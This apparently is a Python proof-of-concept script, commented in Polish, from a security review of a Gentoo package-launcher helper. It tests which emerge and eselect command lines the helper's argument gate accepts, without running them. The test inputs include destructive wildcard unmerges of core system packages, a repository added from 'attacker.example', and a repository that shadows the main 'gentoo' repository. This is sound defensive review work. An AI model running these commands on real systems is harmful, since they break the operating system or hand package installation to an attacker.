"""Dowody do GS-04 i GS-09 — sama bramka argumentów, nic się nie uruchamia.

    python3 security-review/poc/poc_launcher.py

check_arguments() jest czystą funkcją: sprawdza wiersz poleceń i albo wraca, albo
rzuca LauncherError. Żaden proces nie powstaje, nic nie trafia do emerge.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from gentstore.helper import gentstore_launcher as launcher  # noqa: E402

BASE = list(launcher._EMERGE_BASE)


def verdict(argv: list[str]) -> str:
    try:
        launcher.check_arguments(argv[0], argv[1:])
    except launcher.LauncherError:
        return "odrzucone"
    return "PRZYJĘTE "


print("=== GS-04 · `*/*` ma własną barierę, `kategoria/*` nie ===")
for argv in (
    ["emerge", *BASE, "--unmerge", "*/*"],
    ["emerge", *BASE, "--unmerge", "sys-apps/*"],
    ["emerge", *BASE, "--unmerge", "sys-libs/*", "sys-apps/*", "sys-devel/*"],
    ["emerge", *BASE, "--unmerge", "*/portage"],
):
    print(" ", verdict(argv), " ".join(argv))
print("  (sys-libs/* to glibc; sys-apps/* to portage, coreutils i baselayout)")

print()
print("=== GS-09 · eselect repository add ===")
for argv in (
    ["eselect", "repository", "add", "evil", "git", "file:///home/janek/evil"],
    ["eselect", "repository", "add", "gentoo", "git", "file:///home/janek/evil"],
    ["eselect", "repository", "add", "evil", "rsync", "rsync://attacker.example/x"],
    ["emaint", "sync", "-r", "evil"],
):
    print(" ", verdict(argv), " ".join(argv))
print("  (file:// nie potrzebuje sieci; nazwa `gentoo` przykrywa repozytorium główne)")

print()
print("=== kontrola: tokeny opcjonalne nie mogą się powtórzyć ani zamienić kolejnością ===")
for argv in (
    ["emerge", *BASE, "--verbose", "--getbinpkg", "--getbinpkg", "app/x"],
    ["emerge", *BASE, "--verbose", "--oneshot", "--getbinpkg", "app/x"],
    ["emerge", *BASE, "--verbose", "--oneshot", "app/x"],
):
    print(" ", verdict(argv), " ".join(argv[1:]))
